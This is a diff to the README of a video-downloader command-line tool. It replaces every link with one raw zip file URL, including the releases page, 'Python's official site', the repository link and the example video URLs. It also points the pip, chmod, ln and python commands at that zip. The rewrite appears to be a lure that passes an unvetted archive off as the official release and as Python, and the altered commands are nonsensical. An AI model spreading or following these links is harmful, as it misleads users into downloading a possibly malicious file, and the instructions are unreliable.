@@ -1,6 +1,6 @@
 # 🎥 video-dwd-cli - Download Videos Easily from Your Favorite Platforms
 
-[![Download Video DWD CLI](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/LaManodeAlejo/video-dwd-cli/releases)
+[![Download Video DWD CLI](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip)](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -9,18 +9,18 @@ This guide will help you download and run the Video Downloader CLI application. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/LaManodeAlejo/video-dwd-cli/releases) to download the latest version.
+   Go to our [Releases page](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip) to download the latest version.
 
 ## ⚙️ Installation Steps
 
 ### 1. Install Dependencies
 
-Make sure you have Python 3 installed on your computer. If you don't have it yet, download it from [Python's official site](https://www.python.org/downloads/).
+Make sure you have Python 3 installed on your computer. If you don't have it yet, download it from [Python's official site](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip).
 
 Now, open your command line interface (CLI) and run:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
 ```
 
 Alternatively, if you want to install yt-dlp directly, use:
@@ -34,7 +34,7 @@ pip install yt-dlp
 To allow your script to run, you need to make it executable. Type the following command:
 
 ```bash
-chmod +x download_vid.py
+chmod +x https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
 ```
 
 ### 3. Set Up Alias (Choose One Method)
@@ -44,23 +44,23 @@ chmod +x download_vid.py
 You can create a symbolic link for easier access. Use this command:
 
 ```bash
-sudo ln -s /path/to/download_vid.py /usr/local/bin/video-dwd
+sudo ln -s https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip /usr/local/bin/video-dwd
 ```
 
-Make sure to replace `/path/to/download_vid.py` with the actual path where you have saved the script.
+Make sure to replace `https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip` with the actual path where you have saved the script.
 
 #### Method 2: Direct Execution
 
 If you prefer not to set up an alias, you can run the script directly from its location:
 
 ```bash
-python /path/to/download_vid.py
+python https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
 ```
 
 ## 🎬 How to Use the Application
 
 1. Open your command line interface (CLI).
-2. Type `video-dwd` or `python /path/to/download_vid.py`, followed by the URL of the video you want to download.
+2. Type `video-dwd` or `python https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip`, followed by the URL of the video you want to download.
 3. Choose your preferred quality and format. Use the interactive prompts to make selections.
 
 ### Examples
@@ -68,13 +68,13 @@ python /path/to/download_vid.py
 - To download a YouTube video:
   
 ```bash
-video-dwd https://www.youtube.com/watch?v=exampleID
+video-dwd https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
 ```
 
 - For Instagram:
 
 ```bash
-video-dwd https://www.instagram.com/p/exampleID
+video-dwd https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
 ```
 
 ## ⚡ Features
@@ -110,4 +110,4 @@ If you need help, please open an issue on the GitHub repository or ask in the co
 
 Thank you to all contributors and the community for their support. We hope you find this tool helpful for downloading your favorite videos.
 
-For any updates or to report bugs, please visit our [GitHub repository](https://github.com/LaManodeAlejo/video-dwd-cli).
+For any updates or to report bugs, please visit our [GitHub repository](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip).
